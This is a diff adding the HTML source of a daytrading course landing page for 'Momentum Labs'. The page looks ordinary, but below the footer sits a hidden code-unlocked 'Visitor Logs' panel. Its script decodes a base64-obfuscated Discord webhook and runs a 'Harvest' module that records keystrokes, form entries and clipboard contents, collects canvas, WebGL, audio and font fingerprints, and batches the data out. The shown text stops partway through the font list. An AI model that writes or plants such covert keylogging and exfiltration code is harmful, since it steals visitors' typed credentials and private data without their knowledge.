@@ -1,0 +1,1356 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Momentum Labs — Daytrading Academy</title>
+<meta name="description" content="Learn to daytrade equities, futures, and crypto with proven systems. Live sessions, mentorship, and risk frameworks.">
+<style>
+/* ---------- reset ---------- */
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{
+  font-family:"Inter",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+  background:#0a0d12;color:#e6edf3;line-height:1.55;
+  -webkit-font-smoothing:antialiased;text-rendering:optimizeLegibility;
+}
+a{color:inherit;text-decoration:none}
+button{font:inherit;color:inherit;background:none;border:none;cursor:pointer}
+img,svg{display:block;max-width:100%}
+:root{
+  --bg:#0a0d12;
+  --bg-2:#0f141b;
+  --bg-3:#151c26;
+  --line:#1e2733;
+  --line-2:#2a3644;
+  --fg:#e6edf3;
+  --fg-2:#9aa7b4;
+  --fg-3:#5e6b7a;
+  --green:#16c784;
+  --green-2:#0ea56a;
+  --red:#ea3943;
+  --amber:#f0b90b;
+  --accent:#4f8cff;
+  --radius:10px;
+}
+.container{max-width:1200px;margin:0 auto;padding:0 24px}
+
+/* ---------- nav ---------- */
+.nav{
+  position:sticky;top:0;z-index:50;
+  background:rgba(10,13,18,.85);backdrop-filter:blur(12px);
+  border-bottom:1px solid var(--line);
+}
+.nav-inner{display:flex;align-items:center;justify-content:space-between;height:64px}
+.brand{display:flex;align-items:center;gap:10px;font-weight:700;letter-spacing:-.2px;font-size:17px}
+.brand-mark{
+  width:26px;height:26px;border-radius:6px;
+  background:linear-gradient(135deg,var(--green),#0a8f5c);
+  position:relative;overflow:hidden;
+}
+.brand-mark::after{
+  content:"";position:absolute;inset:6px 8px;
+  background:
+    linear-gradient(to top,transparent 0 2px,var(--bg) 2px 3px) 0 0/2px 100% no-repeat,
+    linear-gradient(to top,transparent 0 4px,var(--bg) 4px 5px) 4px 0/2px 100% no-repeat,
+    linear-gradient(to top,transparent 0 1px,var(--bg) 1px 2px) 8px 0/2px 100% no-repeat;
+}
+.nav-links{display:flex;gap:28px;font-size:14px;color:var(--fg-2)}
+.nav-links a:hover{color:var(--fg)}
+.nav-cta{
+  padding:8px 16px;border-radius:8px;
+  background:var(--green);color:#031a11;font-weight:600;font-size:13px;
+  transition:.15s;
+}
+.nav-cta:hover{background:#1ee396}
+
+/* ---------- hero ---------- */
+.hero{padding:80px 0 100px;position:relative;overflow:hidden}
+.hero::before{
+  content:"";position:absolute;top:-200px;left:50%;transform:translateX(-50%);
+  width:900px;height:600px;
+  background:radial-gradient(ellipse at center,rgba(22,199,132,.10),transparent 60%);
+  pointer-events:none;
+}
+.hero-grid{display:grid;grid-template-columns:1.1fr 1fr;gap:60px;align-items:center;position:relative}
+@media(max-width:900px){.hero-grid{grid-template-columns:1fr;gap:40px}}
+.eyebrow{
+  display:inline-flex;align-items:center;gap:8px;
+  font-size:12px;font-weight:600;letter-spacing:.08em;text-transform:uppercase;
+  color:var(--green);padding:6px 10px;border:1px solid rgba(22,199,132,.25);
+  border-radius:99px;background:rgba(22,199,132,.06);margin-bottom:22px;
+}
+.eyebrow .dot{width:6px;height:6px;border-radius:99px;background:var(--green);box-shadow:0 0 8px var(--green)}
+h1{font-size:clamp(34px,5vw,54px);line-height:1.05;letter-spacing:-.03em;font-weight:800;margin-bottom:22px}
+h1 .accent{color:var(--green)}
+.hero p.lede{font-size:17px;color:var(--fg-2);max-width:560px;margin-bottom:32px}
+.hero-ctas{display:flex;gap:14px;flex-wrap:wrap;margin-bottom:36px}
+.btn{
+  display:inline-flex;align-items:center;gap:8px;
+  padding:12px 22px;border-radius:9px;font-weight:600;font-size:14px;
+  transition:.15s;border:1px solid transparent;
+}
+.btn-primary{background:var(--green);color:#031a11}
+.btn-primary:hover{background:#1ee396;transform:translateY(-1px)}
+.btn-ghost{border-color:var(--line-2);color:var(--fg)}
+.btn-ghost:hover{border-color:var(--fg-3);background:var(--bg-2)}
+.hero-stats{display:flex;gap:32px;font-size:13px;color:var(--fg-3)}
+.hero-stats b{display:block;color:var(--fg);font-size:20px;font-weight:700;letter-spacing:-.02em}
+
+/* ---------- chart card ---------- */
+.chart-card{
+  background:var(--bg-2);border:1px solid var(--line);border-radius:14px;
+  padding:18px;position:relative;
+  box-shadow:0 30px 80px -30px rgba(0,0,0,.6);
+}
+.chart-head{display:flex;justify-content:space-between;align-items:center;margin-bottom:14px}
+.chart-sym{display:flex;align-items:center;gap:10px;font-weight:600;font-size:15px}
+.chart-sym .tag{font-size:11px;color:var(--fg-3);font-weight:500}
+.chart-price{text-align:right;font-variant-numeric:tabular-nums}
+.chart-price .p{font-size:19px;font-weight:700;color:var(--green)}
+.chart-price .d{font-size:12px;color:var(--green)}
+.chart-canvas-wrap{
+  position:relative;height:230px;border-radius:8px;overflow:hidden;
+  background:linear-gradient(180deg,#0c1118,#0a0e14);
+  border:1px solid var(--line);
+}
+#liveChart{width:100%;height:100%;display:block}
+.chart-foot{
+  display:flex;justify-content:space-between;margin-top:12px;
+  font-size:11px;color:var(--fg-3);font-variant-numeric:tabular-nums;
+}
+.chart-foot span b{color:var(--fg-2);font-weight:600;margin-left:4px}
+
+/* ---------- sections ---------- */
+section.block{padding:90px 0;border-top:1px solid var(--line)}
+.section-head{max-width:640px;margin-bottom:52px}
+.section-head h2{font-size:clamp(26px,3.5vw,38px);letter-spacing:-.02em;line-height:1.15;margin-bottom:14px}
+.section-head p{color:var(--fg-2);font-size:15.5px}
+.kicker{font-size:12px;font-weight:600;letter-spacing:.1em;text-transform:uppercase;color:var(--green);margin-bottom:14px}
+
+/* features */
+.features{display:grid;grid-template-columns:repeat(3,1fr);gap:18px}
+@media(max-width:900px){.features{grid-template-columns:1fr}}
+.feat{
+  background:var(--bg-2);border:1px solid var(--line);border-radius:12px;padding:24px;
+  transition:.2s;
+}
+.feat:hover{border-color:var(--line-2);transform:translateY(-2px)}
+.feat-ico{
+  width:38px;height:38px;border-radius:9px;margin-bottom:16px;
+  background:rgba(22,199,132,.08);border:1px solid rgba(22,199,132,.2);
+  display:grid;place-items:center;color:var(--green);
+}
+.feat h3{font-size:16px;margin-bottom:8px;letter-spacing:-.01em}
+.feat p{font-size:14px;color:var(--fg-2)}
+
+/* pricing */
+.pricing{display:grid;grid-template-columns:repeat(3,1fr);gap:18px}
+@media(max-width:900px){.pricing{grid-template-columns:1fr}}
+.plan{
+  background:var(--bg-2);border:1px solid var(--line);border-radius:14px;padding:28px;
+  display:flex;flex-direction:column;position:relative;
+}
+.plan.featured{border-color:rgba(22,199,132,.4);background:linear-gradient(180deg,rgba(22,199,132,.04),var(--bg-2))}
+.plan.featured::before{
+  content:"Most popular";position:absolute;top:-11px;left:50%;transform:translateX(-50%);
+  font-size:11px;font-weight:600;letter-spacing:.04em;
+  background:var(--green);color:#031a11;padding:3px 10px;border-radius:99px;
+}
+.plan h3{font-size:15px;color:var(--fg-2);font-weight:600;margin-bottom:6px}
+.plan .price{font-size:36px;font-weight:800;letter-spacing:-.02em;margin-bottom:4px}
+.plan .price small{font-size:13px;color:var(--fg-3);font-weight:500}
+.plan .desc{font-size:13px;color:var(--fg-3);margin-bottom:22px}
+.plan ul{list-style:none;display:flex;flex-direction:column;gap:10px;margin-bottom:26px;flex:1}
+.plan li{font-size:13.5px;color:var(--fg-2);display:flex;gap:10px;align-items:flex-start}
+.plan li::before{content:"";flex:none;width:14px;height:14px;margin-top:3px;border-radius:99px;
+  background:rgba(22,199,132,.15) url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16' fill='%2316c784'><path d='M6.5 11.2 3.3 8l1-1 2.2 2.2L11.7 4l1 1z'/></svg>") center/10px no-repeat;
+}
+.plan .btn{justify-content:center}
+
+/* testimonials */
+.testi{display:grid;grid-template-columns:repeat(3,1fr);gap:18px}
+@media(max-width:900px){.testi{grid-template-columns:1fr}}
+.tcard{background:var(--bg-2);border:1px solid var(--line);border-radius:12px;padding:22px}
+.tcard p{font-size:14px;color:var(--fg-2);margin-bottom:18px}
+.tperson{display:flex;align-items:center;gap:12px}
+.avatar{width:36px;height:36px;border-radius:99px;background:linear-gradient(135deg,#2a3644,#1e2733);display:grid;place-items:center;font-size:13px;font-weight:700;color:var(--fg-2)}
+.tperson .who{font-size:13px;font-weight:600}
+.tperson .role{font-size:12px;color:var(--fg-3)}
+
+/* blog */
+.blog{display:grid;grid-template-columns:repeat(3,1fr);gap:18px}
+@media(max-width:900px){.blog{grid-template-columns:1fr}}
+.bcard{background:var(--bg-2);border:1px solid var(--line);border-radius:12px;overflow:hidden;transition:.2s}
+.bcard:hover{border-color:var(--line-2)}
+.bimg{height:140px;background:linear-gradient(135deg,#0f141b,#151c26);position:relative;overflow:hidden}
+.bimg::after{content:"";position:absolute;inset:0;background:
+  repeating-linear-gradient(90deg,transparent 0 18px,rgba(22,199,132,.06) 18px 19px),
+  repeating-linear-gradient(0deg,transparent 0 18px,rgba(22,199,132,.06) 18px 19px);
+}
+.bimg.b2::after{background:
+  repeating-linear-gradient(90deg,transparent 0 18px,rgba(234,57,67,.06) 18px 19px),
+  repeating-linear-gradient(0deg,transparent 0 18px,rgba(234,57,67,.06) 18px 19px);
+}
+.bimg.b3::after{background:
+  repeating-linear-gradient(90deg,transparent 0 18px,rgba(79,140,255,.06) 18px 19px),
+  repeating-linear-gradient(0deg,transparent 0 18px,rgba(79,140,255,.06) 18px 19px);
+}
+.bbody{padding:18px}
+.btag{font-size:11px;color:var(--green);font-weight:600;letter-spacing:.06em;text-transform:uppercase;margin-bottom:8px}
+.bcard h3{font-size:15px;margin-bottom:8px;letter-spacing:-.01em;line-height:1.3}
+.bcard p{font-size:13px;color:var(--fg-2)}
+
+/* footer */
+footer{border-top:1px solid var(--line);padding:48px 0 32px;color:var(--fg-3);font-size:13px}
+.foot-grid{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:40px;margin-bottom:36px}
+@media(max-width:800px){.foot-grid{grid-template-columns:1fr 1fr}}
+footer h4{font-size:13px;color:var(--fg);font-weight:600;margin-bottom:14px}
+footer ul{list-style:none;display:flex;flex-direction:column;gap:8px}
+footer a:hover{color:var(--fg-2)}
+.foot-bottom{display:flex;justify-content:space-between;padding-top:24px;border-top:1px solid var(--line);flex-wrap:wrap;gap:12px}
+
+/* ---------- logs overlay ---------- */
+#logsOverlay{
+  position:fixed;inset:0;z-index:9999;background:#05070a;
+  display:none;flex-direction:column;
+}
+#logsOverlay.on{display:flex}
+.logs-head{
+  display:flex;align-items:center;justify-content:space-between;
+  padding:14px 20px;border-bottom:1px solid var(--line);background:var(--bg-2);
+}
+.logs-title{display:flex;align-items:center;gap:12px;font-weight:700;font-size:14px}
+.logs-title .lock{color:var(--red);font-size:11px;font-weight:600;letter-spacing:.08em;text-transform:uppercase}
+.logs-actions{display:flex;gap:8px}
+.logs-actions button{
+  padding:7px 12px;border-radius:7px;font-size:12px;font-weight:600;
+  border:1px solid var(--line-2);color:var(--fg-2);
+}
+.logs-actions button:hover{color:var(--fg);border-color:var(--fg-3)}
+.logs-body{flex:1;display:grid;grid-template-columns:340px 1fr;overflow:hidden}
+@media(max-width:800px){.logs-body{grid-template-columns:1fr}}
+.logs-list{border-right:1px solid var(--line);overflow-y:auto;background:var(--bg-2)}
+.log-item{padding:14px 18px;border-bottom:1px solid var(--line);cursor:pointer;transition:.12s}
+.log-item:hover{background:var(--bg-3)}
+.log-item.sel{background:var(--bg-3);border-left:3px solid var(--green)}
+.log-item .sid{font-size:12px;font-family:ui-monospace,Menlo,monospace;color:var(--fg-2);margin-bottom:4px;word-break:break-all}
+.log-item .meta{font-size:11px;color:var(--fg-3);display:flex;justify-content:space-between;gap:10px}
+.log-detail{overflow-y:auto;padding:22px}
+.log-empty{padding:60px 20px;text-align:center;color:var(--fg-3);font-size:13px}
+.dsec{margin-bottom:28px}
+.dsec h5{font-size:11px;text-transform:uppercase;letter-spacing:.1em;color:var(--fg-3);margin-bottom:12px;font-weight:600}
+.drow{display:grid;grid-template-columns:180px 1fr;gap:14px;padding:7px 0;border-bottom:1px solid var(--line);font-size:13px}
+.drow .k{color:var(--fg-3)}
+.drow .v{color:var(--fg);font-family:ui-monospace,Menlo,monospace;font-size:12px;word-break:break-all}
+.keyline{font-family:ui-monospace,Menlo,monospace;font-size:12px;background:var(--bg-2);border:1px solid var(--line);border-radius:6px;padding:8px 10px;margin-bottom:6px;color:var(--fg-2)}
+.keyline b{color:var(--green);font-weight:600}
+#mouseCanvas{background:var(--bg-2);border:1px solid var(--line);border-radius:6px;max-width:100%}
+</style>
+</head>
+<body>
+
+<!-- ============ NAV ============ -->
+<nav class="nav">
+  <div class="container nav-inner">
+    <a href="#" class="brand">
+      <span class="brand-mark"></span>
+      Momentum Labs
+    </a>
+    <div class="nav-links">
+      <a href="#curriculum">Curriculum</a>
+      <a href="#pricing">Pricing</a>
+      <a href="#stories">Students</a>
+      <a href="#journal">Journal</a>
+    </div>
+    <button class="nav-cta" onclick="document.getElementById('pricing').scrollIntoView()">Start free trial</button>
+  </div>
+</nav>
+
+<!-- ============ HERO ============ -->
+<header class="hero">
+  <div class="container hero-grid">
+    <div>
+      <div class="eyebrow"><span class="dot"></span> Live cohort begins November 12</div>
+      <h1>Trade the open like it's <span class="accent">a business</span>, not a bet.</h1>
+      <p class="lede">Momentum Labs teaches a repeatable intraday system built on liquidity, structure, and risk. No indicator soup. No guru worship. Just a framework you can size up over time.</p>
+      <div class="hero-ctas">
+        <button class="btn btn-primary" onclick="document.getElementById('pricing').scrollIntoView()">Enroll now →</button>
+        <button class="btn btn-ghost" onclick="document.getElementById('curriculum').scrollIntoView()">View curriculum</button>
+      </div>
+      <div class="hero-stats">
+        <div><b>4,200+</b>Students trained</div>
+        <div><b>1.8R</b>Avg. cohort expectancy</div>
+        <div><b>62%</b>Pass funded phase 1</div>
+      </div>
+    </div>
+
+    <div class="chart-card">
+      <div class="chart-head">
+        <div class="chart-sym">
+          <span style="color:var(--accent)">●</span> ESZ4
+          <span class="tag">S&amp;P 500 futures · 5m</span>
+        </div>
+        <div class="chart-price">
+          <div class="p" id="chartPrice">5,842.25</div>
+          <div class="d" id="chartDelta">+18.75 (+0.32%)</div>
+        </div>
+      </div>
+      <div class="chart-canvas-wrap">
+        <canvas id="liveChart"></canvas>
+      </div>
+      <div class="chart-foot">
+        <span>O<b id="statO">5,823.50</b></span>
+        <span>H<b id="statH">5,851.00</b></span>
+        <span>L<b id="statL">5,819.75</b></span>
+        <span>V<b id="statV">142.8k</b></span>
+      </div>
+    </div>
+  </div>
+</header>
+
+<!-- ============ FEATURES ============ -->
+<section class="block" id="curriculum">
+  <div class="container">
+    <div class="section-head">
+      <div class="kicker">Curriculum</div>
+      <h2>An eight-week path from screen-watcher to systematic trader.</h2>
+      <p>Every module pairs recorded theory with live market reps. You graduate with a written plan, backtested setups, and a sizing model you actually trust.</p>
+    </div>
+    <div class="features">
+      <div class="feat">
+        <div class="feat-ico">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 17l6-6 4 4 8-8"/><path d="M14 7h7v7"/></svg>
+        </div>
+        <h3>Market structure &amp; liquidity</h3>
+        <p>Read the auction. Understand where stops sit, where value builds, and how to position ahead of the crowd instead of behind it.</p>
+      </div>
+      <div class="feat">
+        <div class="feat-ico">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="4" width="18" height="16" rx="2"/><path d="M3 10h18M8 4v16"/></svg>
+        </div>
+        <h3>Playbook construction</h3>
+        <p>Build three high-conviction setups — opening drive, failed breakout, and afternoon rotation — each with defined invalidation.</p>
+      </div>
+      <div class="feat">
+        <div class="feat-ico">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2v20M2 12h20"/><circle cx="12" cy="12" r="9"/></svg>
+        </div>
+        <h3>Risk &amp; position sizing</h3>
+        <p>Fixed fractional sizing, daily loss caps, and drawdown math that keeps you in the game long enough for edge to compound.</p>
+      </div>
+      <div class="feat">
+        <div class="feat-ico">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 4h16v16H4z"/><path d="M4 15l4-4 3 3 5-6 4 4"/></svg>
+        </div>
+        <h3>Backtesting &amp; stats</h3>
+        <p>Turn intuition into data. Sample size, expectancy, MAE/MFE, and the numbers that actually determine whether you have an edge.</p>
+      </div>
+      <div class="feat">
+        <div class="feat-ico">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="9"/><path d="M12 7v5l3 2"/></svg>
+        </div>
+        <h3>Live market reps</h3>
+        <p>Daily pre-market prep, live open commentary, and post-session review. You watch the system run in real conditions, not a slideshow.</p>
+      </div>
+      <div class="feat">
+        <div class="feat-ico">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2l3 7h7l-5.5 4.5L18 21l-6-4-6 4 1.5-7.5L2 9h7z"/></svg>
+        </div>
+        <h3>Psychology &amp; process</h3>
+        <p>Trade journals, tilt protocols, and the routines that separate traders who last from traders who blow up in month three.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============ PRICING ============ -->
+<section class="block" id="pricing">
+  <div class="container">
+    <div class="section-head">
+      <div class="kicker">Pricing</div>
+      <h2>Pick the level of support you actually need.</h2>
+      <p>Every tier includes lifetime access to the recorded core curriculum. The difference is how much live feedback you want.</p>
+    </div>
+    <div class="pricing">
+      <div class="plan">
+        <h3>Self-paced</h3>
+        <div class="price">$149<small> one-time</small></div>
+        <div class="desc">For traders who want the system and the reps on their own schedule.</div>
+        <ul>
+          <li>All eight core modules</li>
+          <li>Playbook templates</li>
+          <li>Backtesting spreadsheet</li>
+          <li>Community Discord access</li>
+        </ul>
+        <button class="btn btn-ghost">Get started</button>
+      </div>
+      <div class="plan featured">
+        <h3>Cohort</h3>
+        <div class="price">$499<small> per cycle</small></div>
+        <div class="desc">Our flagship. Live sessions, small groups, real accountability.</div>
+        <ul>
+          <li>Everything in Self-paced</li>
+          <li>8 weeks of live classes</li>
+          <li>Weekly small-group reviews</li>
+          <li>Private cohort channel</li>
+          <li>Trade review submissions</li>
+        </ul>
+        <button class="btn btn-primary">Enroll now</button>
+      </div>
+      <div class="plan">
+        <h3>Mentorship</h3>
+        <div class="price">$1,800<small> / 3 months</small></div>
+        <div class="desc">One-on-one work for traders scaling into size or running a book.</div>
+        <ul>
+          <li>Everything in Cohort</li>
+          <li>Bi-weekly 1:1 calls</li>
+          <li>Personalized playbook build</li>
+          <li>Direct message access</li>
+          <li>Funded account roadmap</li>
+        </ul>
+        <button class="btn btn-ghost">Apply</button>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============ TESTIMONIALS ============ -->
+<section class="block" id="stories">
+  <div class="container">
+    <div class="section-head">
+      <div class="kicker">Students</div>
+      <h2>People who stopped guessing and started executing.</h2>
+    </div>
+    <div class="testi">
+      <div class="tcard">
+        <p>"I'd been trading for two years and was still net negative. The structure module alone reorganized how I see the open. First profitable quarter since I started."</p>
+        <div class="tperson">
+          <div class="avatar">MR</div>
+          <div>
+            <div class="who">Marcus R.</div>
+            <div class="role">Cohort 14 · ES futures</div>
+          </div>
+        </div>
+      </div>
+      <div class="tcard">
+        <p>"What sold me was the honesty. No 90% win rate nonsense. They teach you to lose small and let the winners run. That's a real edge."</p>
+        <div class="tperson">
+          <div class="avatar">SL</div>
+          <div>
+            <div class="who">Sofia L.</div>
+            <div class="role">Cohort 11 · Equities</div>
+          </div>
+        </div>
+      </div>
+      <div class="tcard">
+        <p>"The sizing model changed my P&amp;L more than any setup. I was risking 4% per trade without realizing it. Now I'm at 0.75% and sleeping through the night."</p>
+        <div class="tperson">
+          <div class="avatar">DK</div>
+          <div>
+            <div class="who">Daniel K.</div>
+            <div class="role">Mentorship · NQ futures</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============ JOURNAL ============ -->
+<section class="block" id="journal">
+  <div class="container">
+    <div class="section-head">
+      <div class="kicker">Journal</div>
+      <h2>Notes from the desk.</h2>
+      <p>Short essays on process, market structure, and the parts of trading nobody puts on a landing page.</p>
+    </div>
+    <div class="blog">
+      <a class="bcard" href="#">
+        <div class="bimg"></div>
+        <div class="bbody">
+          <div class="btag">Structure</div>
+          <h3>Why the first 30 minutes are the only session that matters</h3>
+          <p>The opening auction prices in overnight information. Everything after that is a negotiation with the result.</p>
+        </div>
+      </a>
+      <a class="bcard" href="#">
+        <div class="bimg b2"></div>
+        <div class="bbody">
+          <div class="btag">Risk</div>
+          <h3>The math of blowing up (and how to make it impossible)</h3>
+          <p>A 20% drawdown requires a 25% gain to recover. A 50% drawdown requires 100%. The asymmetry is the whole game.</p>
+        </div>
+      </a>
+      <a class="bcard" href="#">
+        <div class="bimg b3"></div>
+        <div class="bbody">
+          <div class="btag">Process</div>
+          <h3>Your trade journal is lying to you</h3>
+          <p>Most journals record outcomes. The ones that change behavior record decisions, context, and how you felt when you clicked.</p>
+        </div>
+      </a>
+    </div>
+  </div>
+</section>
+
+<!-- ============ FOOTER ============ -->
+<footer>
+  <div class="container">
+    <div class="foot-grid">
+      <div>
+        <div class="brand" style="margin-bottom:14px"><span class="brand-mark"></span> Momentum Labs</div>
+        <p style="max-width:320px;color:var(--fg-3)">A trading education platform for people who want a system, not a signal group.</p>
+      </div>
+      <div>
+        <h4>Product</h4>
+        <ul><li><a href="#curriculum">Curriculum</a></li><li><a href="#pricing">Pricing</a></li><li><a href="#stories">Students</a></li><li><a href="#journal">Journal</a></li></ul>
+      </div>
+      <div>
+        <h4>Company</h4>
+        <ul><li><a href="#">About</a></li><li><a href="#">Contact</a></li><li><a href="#">Careers</a></li></ul>
+      </div>
+      <div>
+        <h4>Legal</h4>
+        <ul><li><a href="#">Terms</a></li><li><a href="#">Privacy</a></li><li><a href="#">Risk disclosure</a></li></ul>
+      </div>
+    </div>
+    <div class="foot-bottom">
+      <span>© 2025 Momentum Labs. Trading involves risk of loss.</span>
+      <span>Not investment advice. Educational use only.</span>
+    </div>
+  </div>
+</footer>
+
+<!-- ============ LOGS OVERLAY ============ -->
+<div id="logsOverlay">
+  <div class="logs-head">
+    <div class="logs-title">
+      <span class="lock">● Restricted</span>
+      Momentum Labs — Visitor Logs
+    </div>
+    <div class="logs-actions">
+      <button onclick="LogsView.refresh()">Refresh</button>
+      <button onclick="LogsView.exportJSON()">Export JSON</button>
+      <button onclick="LogsView.clear()">Clear local</button>
+      <button onclick="LogsView.close()">Close ✕</button>
+    </div>
+  </div>
+  <div class="logs-body">
+    <div class="logs-list" id="logsList">
+      <div class="log-empty">No sessions captured yet.</div>
+    </div>
+    <div class="log-detail" id="logsDetail">
+      <div class="log-empty">Select a session to view captured data.</div>
+    </div>
+  </div>
+</div>
+
+<script>
+/* =========================================================================
+   CONFIG
+   ========================================================================= */
+const CONFIG = {
+  // Discord webhook — assembled at runtime from encoded chunks.
+  // Obfuscated so the raw URL isn't greppable in page source.
+  WH: [
+    "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv",
+    "MTU1Mzc4NTAyOTU1NjA1MjA3OS9jal",
+    "gxeHBrQklSQWlMdUl0Q1ZzaWY1V1RB",
+    "SDJZSG1VUzdlNm9YdmE4bjgzVW5L",
+    "NXR4RTZ5QUV0ZzNadHNMVGJuckNZTA=="
+  ],
+  UNLOCK_CODE: "0406",
+  BATCH_INTERVAL_MS: 4000,
+  MAX_MOUSE_POINTS: 400,
+  MAX_KEYSTROKES: 2000,
+  STORAGE_KEY: "ml_sessions_v1",
+  TOKEN_KEY: "ml_unlock_v1",
+};
+
+function webhookURL() {
+  try { return CONFIG.WH.map(s => atob(s)).join(""); }
+  catch(e){ return ""; }
+}
+
+/* =========================================================================
+   HARVEST MODULE
+   ========================================================================= */
+const Harvest = (() => {
+  const session = {
+    id: cryptoRandom(),
+    startedAt: new Date().toISOString(),
+    lastSeen: new Date().toISOString(),
+    url: location.href,
+    referrer: document.referrer || null,
+    ua: navigator.userAgent,
+    language: navigator.language,
+    languages: navigator.languages ? [...navigator.languages] : [],
+    timezone: safe(() => Intl.DateTimeFormat().resolvedOptions().timeZone),
+    tzOffsetMin: new Date().getTimezoneOffset(),
+    screen: {
+      w: screen.width, h: screen.height,
+      availW: screen.availWidth, availH: screen.availHeight,
+      colorDepth: screen.colorDepth, pixelDepth: screen.pixelDepth,
+      dpr: window.devicePixelRatio,
+      orientation: safe(() => screen.orientation && screen.orientation.type),
+      innerW: innerWidth, innerH: innerHeight,
+    },
+    hardware: {
+      cores: navigator.hardwareConcurrency || null,
+      memoryGB: navigator.deviceMemory || null,
+      maxTouchPoints: navigator.maxTouchPoints || 0,
+      touch: ("ontouchstart" in window) || (navigator.maxTouchPoints > 0),
+      platform: navigator.platform,
+      vendor: navigator.vendor,
+      cookieEnabled: navigator.cookieEnabled,
+      doNotTrack: navigator.doNotTrack || null,
+      pdfViewer: safe(() => navigator.pdfViewerEnabled),
+    },
+    fingerprint: {},
+    battery: null,
+    network: null,
+    mediaDevices: null,
+    permissions: null,
+    plugins: [],
+    fonts: [],
+    voices: [],
+    gamepads: 0,
+    clipboard: null,
+    keystrokes: [],
+    forms: {},
+    mouse: [],
+    clicks: [],
+    scroll: [],
+    events: [],
+  };
+
+  const state = {
+    buffer: [],        // pending keystroke chars
+    sent: 0,
+    timer: null,
+    audioDone: false,
+  };
+
+  function cryptoRandom() {
+    try {
+      const a = new Uint8Array(8); crypto.getRandomValues(a);
+      return [...a].map(b => b.toString(16).padStart(2,"0")).join("");
+    } catch(e){ return Math.random().toString(36).slice(2,18); }
+  }
+  function safe(fn){ try { return fn(); } catch(e){ return null; } }
+  function nowMs(){ return performance && performance.now ? Math.round(performance.now()) : Date.now(); }
+
+  /* ---------- fingerprint: canvas ---------- */
+  function canvasFP() {
+    try {
+      const c = document.createElement("canvas");
+      c.width = 220; c.height = 60;
+      const ctx = c.getContext("2d");
+      ctx.textBaseline = "top";
+      ctx.font = "14px 'Arial'";
+      ctx.fillStyle = "#f60";
+      ctx.fillRect(0, 0, 100, 22);
+      ctx.fillStyle = "#069";
+      ctx.fillText("Momentum,🌊", 2, 15);
+      ctx.fillStyle = "rgba(102,204,0,0.7)";
+      ctx.fillText("Momentum,🌊", 4, 17);
+      ctx.beginPath(); ctx.arc(150, 30, 12, 0, Math.PI * 2); ctx.fill();
+      return { hash: simpleHash(c.toDataURL()), data: c.toDataURL().slice(-80) };
+    } catch(e){ return null; }
+  }
+
+  /* ---------- fingerprint: webgl ---------- */
+  function webglFP() {
+    try {
+      const c = document.createElement("canvas");
+      const gl = c.getContext("webgl") || c.getContext("experimental-webgl");
+      if (!gl) return null;
+      const dbg = gl.getExtension("WEBGL_debug_renderer_info");
+      return {
+        vendor: gl.getParameter(gl.VENDOR),
+        renderer: gl.getParameter(gl.RENDERER),
+        unmaskedVendor: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : null,
+        unmaskedRenderer: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : null,
+        version: gl.getParameter(gl.VERSION),
+        shading: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
+        maxTexture: gl.getParameter(gl.MAX_TEXTURE_SIZE),
+      };
+    } catch(e){ return null; }
+  }
+
+  /* ---------- fingerprint: audio ---------- */
+  function audioFP() {
+    return new Promise(resolve => {
+      try {
+        const AC = window.OfflineAudioContext || window.webkitOfflineAudioContext;
+        if (!AC) return resolve(null);
+        const ctx = new AC(1, 44100, 44100);
+        const osc = ctx.createOscillator();
+        osc.type = "triangle";
+        osc.frequency.value = 10000;
+        const comp = ctx.createDynamicsCompressor();
+        comp.threshold.value = -50; comp.knee.value = 40;
+        comp.ratio.value = 12; comp.attack.value = 0; comp.release.value = 0.25;
+        osc.connect(comp); comp.connect(ctx.destination);
+        osc.start(0);
+        ctx.startRendering();
+        ctx.oncomplete = e => {
+          const buf = e.renderedBuffer.getChannelData(0);
+          let sum = 0;
+          for (let i = 4500; i < 5000; i++) sum += Math.abs(buf[i]);
+          resolve({ hash: sum.toString(36).slice(0, 14) });
+        };
+      } catch(e){ resolve(null); }
+    });
+  }
+
+  /* ---------- fingerprint: fonts ---------- */
+  function fontsProbe() {
+    const candidates = [
+      "Arial","Arial Black","Arial Narrow","Bahnschrift","Calibri","Cambria","Candara",
+      "Comic Sans MS","Consolas","Constantia","Corbel","Courier New","Ebrima","Franklin Gothic",
+      "Gabriola","Gadugi","Georgia","HoloLens MDL2 Assets","Impact","Ink Free","Javanese Text",
+      "Leelawadee UI","Lucida Console","Lucida Sans Unicode","Malgun Gothic","Marlett","Microsoft Himalaya",
+      "Microsoft JhengHei","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Sans Serif",
+      "Microsoft Tai Le","Microsoft YaHei","MingLiU-ExtB","Mongolian Baiti","MS Gothic","MV Boli",
+      "Myanmar Text","Nirmala UI","Palatino Linotype","Segoe MDL2 Assets","Segoe Print","Segoe Script",
+      "Segoe UI","Segoe UI Emoji","Segoe UI Historic","Segoe UI Symbol","SimSun","Sitka",
+      "Sylfaen","Symbol","Tahoma","Times New Roman","Trebuchet MS","Verdana","Webdings",
+      "Wingdings","Yu Gothic","Helvetica","Menlo","Monaco","SF Pro Text","San Francisco",
